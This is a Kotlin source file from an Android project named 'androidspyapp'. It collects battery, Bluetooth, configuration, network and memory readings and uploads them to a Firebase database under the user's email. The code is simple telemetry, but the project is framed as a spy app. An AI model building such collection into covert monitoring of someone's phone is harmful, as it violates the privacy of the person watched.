package com.komnacki.androidspyapp

import android.content.Context
import android.util.Log
import com.google.android.gms.tasks.OnCompleteListener
import com.google.android.gms.tasks.Task
import com.google.firebase.database.*
import com.komnacki.androidspyapp.device.battery.BatteryState
import com.komnacki.androidspyapp.device.bluetooth.BluetoothState
import com.komnacki.androidspyapp.device.config.ConfigState
import com.komnacki.androidspyapp.device.memory.MemoryState
import com.komnacki.androidspyapp.device.network.NetworkState
import github.nisrulz.easydeviceinfo.base.EasyConfigMod
import java.text.SimpleDateFormat
import java.util.*

class MessageUtils {
    private val BATTERY_DATABASE_TAG = "BATTERY"
    private val BLUETOOTH_DATABASE_TAG = "BLUETOOTH"
    private val CONFIG_DATABASE_TAG = "CONFIG"
    private val NETWORK_DATABASE_TAG = "NETWORK"
    private val MEMORY_DATABASE_TAG = "MEMORY"

    companion object {
        lateinit var userEmail: String
        lateinit var context: Context
        fun getInstance(context: Context, userEmail: String): MessageUtils {
            this.context = context
            this.userEmail = userEmail
            return MessageUtils()
        }
    }

    fun getBaseHeader(): DatabaseReference {
        val easyConfigMode = EasyConfigMod(context)
        val currDate = SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(Date())
        return FirebaseDatabase.getInstance().reference
            .child(userEmail)
            .child(currDate)
            .child(easyConfigMode.formattedTime)
    }

    fun sendData() {
        Log.d("KK: ", "sendBatteryMessage method")
        val batteryState = BatteryState(context)
        val bluetoothState = BluetoothState(context)
        val configState = ConfigState(context)
        val networkState = NetworkState(context)
        val memoryState = MemoryState(context)

        val values = mutableMapOf<String, Any>()
        batteryState.getData().forEach { item ->
            Log.d("KK: ", "for each: " + item.toString())
            values[BATTERY_DATABASE_TAG + "/" + item.key] = item.value
        }
        bluetoothState.getData().forEach{ item ->
            values[BLUETOOTH_DATABASE_TAG + "/" + item.key] = item.value
        }
        configState.getData().forEach{ item ->
            values[CONFIG_DATABASE_TAG + "/" + item.key] = item.value
        }
        networkState.getData().forEach{ item ->
            values[NETWORK_DATABASE_TAG + "/" + item.key] = item.value
        }
        memoryState.getData().forEach{ item ->
            values[MEMORY_DATABASE_TAG + "/" + item.key] = item.value
        }
        getBaseHeader().updateChildren(values).addOnCompleteListener(object : OnCompleteListener<Void> {
            override fun onComplete(p0: Task<Void>) {
                Log.d("KK: ", "update childrens complete!")
            }
        })
//        val transactionHandler = object : Transaction.Handler {
//            override fun onComplete(p0: DatabaseError?, p1: Boolean, p2: DataSnapshot?) {
//                Log.d("KK: ", "onComplete transaction")
//            }
//
//            override fun doTransaction(p0: MutableData): Transaction.Result {
//                p0.child(BATTERY_DATABASE_TAG)
//                batteryState.getData(context).forEach { item ->
//                    Log.d("KK: ", "for each: " + item.toString())
//                    p0.child(item.key).value = item.value
//                }
//                p0.
//
//                return Transaction.success(p0)
//            }
//        }
//
//        getBaseHeader()
//            .runTransaction(transactionHandler)
    }
}